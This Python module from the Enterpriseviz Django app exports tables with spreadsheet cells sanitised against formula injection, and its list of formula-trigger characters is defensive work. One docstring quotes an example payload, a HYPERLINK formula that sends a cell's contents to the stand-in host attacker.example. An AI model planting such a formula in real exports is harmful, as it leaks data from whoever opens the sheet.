# ----------------------------------------------------------------------
# Enterpriseviz
# Copyright (C) 2025 David C Jantz
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program. If not, see <https://www.gnu.org/licenses/>.
# ----------------------------------------------------------------------
"""Table export that is safe to open in a spreadsheet."""
from django_tables2.export.export import TableExport
from tablib import Dataset

#: Leading characters that make a spreadsheet treat a cell as a formula.
#: Tab and CR are included because they can be used to shift a payload into
#: a following cell that then starts with one of the others.
FORMULA_TRIGGERS = ("=", "+", "-", "@", "\t", "\r")

#: Formats whose consumers evaluate formulas.
RISKY_FORMATS = ("csv", "tsv", "xls", "xlsx", "ods")


def sanitize_cell(value):
    """
    Prefix an apostrophe so a spreadsheet treats the cell as literal text.

    Almost every value exported here is text the application read out of a
    portal — item titles, layer names, usernames, log messages. Excel,
    LibreOffice and Sheets treat a cell beginning with =, +, - or @ as a
    formula, so a portal user who titles an item
    `=HYPERLINK("https://attacker.example?d="&A1,"open")` gets code running in
    the spreadsheet of whoever opens the export. The apostrophe is not part of
    the value once the sheet is open.

    This is load-bearing for the openpyxl workbooks in app/reports.py as well
    as for the CSV path: assigning a string starting with "=" to a cell makes
    openpyxl set data_type "f" and write a live formula into the file. Once the
    apostrophe is there the cell no longer starts with "=", so it is stored as
    a string.
    """
    if isinstance(value, str) and value.startswith(FORMULA_TRIGGERS):
        return "'" + value
    return value


class SafeTableExport(TableExport):
    """
    Stop exported cells from being evaluated as spreadsheet formulas.

    See :func:`sanitize_cell` for why. Only applied to the tabular formats
    where formulas evaluate; adding it to JSON or YAML would corrupt the data
    for no benefit.
    """

    FORMULA_TRIGGERS = FORMULA_TRIGGERS
    RISKY_FORMATS = RISKY_FORMATS
    sanitize_value = staticmethod(sanitize_cell)

    def table_to_dataset(self, table, exclude_columns, dataset_kwargs=None):
        dataset = super().table_to_dataset(table, exclude_columns, dataset_kwargs)
        if self.format not in self.RISKY_FORMATS:
            return dataset

        safe = Dataset(title=dataset.title)
        if dataset.headers:
            safe.headers = [self.sanitize_value(header) for header in dataset.headers]
        for row in dataset:
            safe.append([self.sanitize_value(value) for value in row])
        return safe
